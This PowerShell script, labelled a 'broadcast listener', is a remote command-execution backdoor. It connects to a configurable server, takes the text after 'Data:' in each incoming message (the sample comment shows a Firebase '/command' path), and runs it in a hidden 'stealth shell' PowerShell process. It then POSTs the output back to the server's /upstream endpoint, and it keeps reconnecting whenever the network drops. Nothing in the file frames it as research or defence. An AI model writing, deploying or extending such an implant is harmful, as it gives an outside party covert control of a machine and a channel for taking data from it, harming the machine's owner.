# PowerShell Broadcast Listener
# Usage: .\listener.ps1 [server] [tcpPort] [httpPort]

param(
    [string]$server = "127.0.0.1",
    [int]$tcpPort = 8081,
    [int]$httpPort = 5005
)

# Function to check WiFi/Network availability
function Test-NetworkConnection {
    try {
        $ping = Test-Connection -ComputerName 8.8.8.8 -Count 1 -Quiet -ErrorAction SilentlyContinue
        return $ping
    }
    catch {
        return $false
    }
}

# Function to wait for network
function Wait-ForNetwork {
    Write-Host "No network connection detected. Waiting for WiFi..." -ForegroundColor Yellow
    while (-not (Test-NetworkConnection)) {
        Start-Sleep -Seconds 5
        Write-Host "." -NoNewline -ForegroundColor Yellow
    }
    Write-Host "`nNetwork connection restored!" -ForegroundColor Green
}

# Function to connect to server
function Connect-ToServer {
    param($server, $tcpPort)
    
    try {
        $client = New-Object System.Net.Sockets.TcpClient($server, $tcpPort)
        $stream = $client.GetStream()
        $reader = New-Object System.IO.StreamReader($stream)
        return @{
            Client = $client
            Stream = $stream
            Reader = $reader
            Success = $true
        }
    }
    catch {
        return @{
            Client = $null
            Stream = $null
            Reader = $null
            Success = $false
            Error = $_.Exception.Message
        }
    }
}

# Initial network check
if (-not (Test-NetworkConnection)) {
    Wait-ForNetwork
}

# Main connection loop
$connectionAttempts = 0
$maxRetries = 3
$client = $null
$stream = $null
$reader = $null

while ($true) {
    # Try to connect to server
    Write-Host "Attempting to connect to server $server`:$tcpPort..." -ForegroundColor Cyan
    $connection = Connect-ToServer -server $server -tcpPort $tcpPort
    
    if ($connection.Success) {
        $client = $connection.Client
        $stream = $connection.Stream
        $reader = $connection.Reader
        $connectionAttempts = 0

        Write-Host "Connected successfully!" -ForegroundColor Green
        Write-Host "Listening to broadcasts from $server`:$tcpPort" -ForegroundColor Green
        Write-Host "HTTP endpoint: http://$server`:$httpPort/upstream" -ForegroundColor Cyan
        Write-Host "Press Ctrl+C to stop listening" -ForegroundColor Yellow
        Write-Host ""

        try {
            while ($true) {
                # Periodic network check
                if (-not (Test-NetworkConnection)) {
                    Write-Host "`nNetwork connection lost!" -ForegroundColor Red
                    throw [System.Net.Sockets.SocketException]::new("Network unavailable")
                }

                # Check for incoming messages from server
                if ($stream.DataAvailable) {
                    $message = $reader.ReadLine()
                    if ($message -eq $null) {
                        Write-Host "`nConnection closed by server" -ForegroundColor Yellow
                        throw [System.Net.Sockets.SocketException]::new("Connection closed")
                    }
                    if ($message -ne $null) {
                        Write-Host "[Broadcast] $message" -ForegroundColor Cyan
                        # sample print [Broadcast] [2025-11-30T16:29:52.395450] Firebase Change - Path: /command, Data: ls
                        # extract the cmd after 'Data: '
                        if ($message -match 'Data:\s*(.+)$') {
                            $cmd = $matches[1]
                            Write-Host "Executing command: $cmd" -ForegroundColor Green
                            # if cmd is not empty, execute it (if the cmd makes errors, ignore them)
                            # output should be send back to server as a text msg to POST /upstream
                            try {
                                if ($cmd.Trim() -ne "") {
                                    # Execute command sequence in a temporary stealth shell
                                    $psi = New-Object System.Diagnostics.ProcessStartInfo
                                    $psi.FileName = "powershell.exe"
                                    $psi.Arguments = "-NoProfile -NonInteractive -WindowStyle Hidden -Command `"$cmd`""
                                    $psi.RedirectStandardOutput = $true
                                    $psi.RedirectStandardError = $true
                                    $psi.UseShellExecute = $false
                                    $psi.CreateNoWindow = $true
                                    
                                    $process = New-Object System.Diagnostics.Process
                                    $process.StartInfo = $psi
                                    $process.Start() | Out-Null
                                    
                                    $output = $process.StandardOutput.ReadToEnd()
                                    $errorOutput = $process.StandardError.ReadToEnd()
                                    $process.WaitForExit()
                                    
                                    # Combine stdout and stderr
                                    if ($errorOutput) {
                                        $output += "`n" + $errorOutput
                                    }
                                    
                                    Write-Host "Command executed successfully" -ForegroundColor Green
                                    Write-Host "Output: $output" -ForegroundColor Gray
                                    
                                    # Send output back to server as a text message to POST /upstream
                                    $body = @{ output = $output } | ConvertTo-Json
                                    try {
                                        Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                                        Write-Host "Result sent to server" -ForegroundColor Green
                                    }
                                    catch {
                                        Write-Host "Warning: Could not send result to server - $($_.Exception.Message)" -ForegroundColor Yellow
                                    }
                                }
                            }
                            catch {
                                Write-Host "Error executing command: $($_.Exception.Message)" -ForegroundColor Red
                                # Send error back to server as a text message to POST /upstream
                                $errorOutput = "ERROR: $($_.Exception.Message)"
                                $body = @{ output = $errorOutput } | ConvertTo-Json
                                try {
                                    Invoke-RestMethod -Uri "http://${server}:${httpPort}/upstream" -Method POST -Body $body -ContentType "application/json" -ErrorAction Stop | Out-Null
                                    Write-Host "Error sent to server" -ForegroundColor Yellow
                                }
                                catch {
                                    Write-Host "Warning: Could not send error to server" -ForegroundColor Yellow
                                }
                            }
                        }
                    }
                }
                Start-Sleep -Milliseconds 100
            }
        }
        catch {
            Write-Host "`nConnection error: $($_.Exception.Message)" -ForegroundColor Red
            
            # Clean up current connection
            if ($reader) { $reader.Close(); $reader = $null }
            if ($stream) { $stream.Close(); $stream = $null }
            if ($client) { $client.Close(); $client = $null }
            
            # Check if it's a network issue
            if (-not (Test-NetworkConnection)) {
                Wait-ForNetwork
                $connectionAttempts = 0
            }
            else {
                $connectionAttempts++
                if ($connectionAttempts -ge $maxRetries) {
                    Write-Host "Max connection attempts reached. Waiting 30 seconds before retry..." -ForegroundColor Yellow
                    Start-Sleep -Seconds 30
                    $connectionAttempts = 0
                }
                else {
                    Write-Host "Retrying connection in 5 seconds... (Attempt $connectionAttempts/$maxRetries)" -ForegroundColor Yellow
                    Start-Sleep -Seconds 5
                }
            }
        }
    }
    else {
        Write-Host "Failed to connect: $($connection.Error)" -ForegroundColor Red
        $connectionAttempts++
        
        if ($connectionAttempts -ge $maxRetries) {
            Write-Host "Max connection attempts reached. Checking network..." -ForegroundColor Yellow
            if (-not (Test-NetworkConnection)) {
                Wait-ForNetwork
            }
            else {
                Write-Host "Network is available but server is unreachable. Waiting 30 seconds..." -ForegroundColor Yellow
                Start-Sleep -Seconds 30
            }
            $connectionAttempts = 0
        }
        else {
            Write-Host "Retrying in 5 seconds... (Attempt $connectionAttempts/$maxRetries)" -ForegroundColor Yellow
            Start-Sleep -Seconds 5
        }
    }
}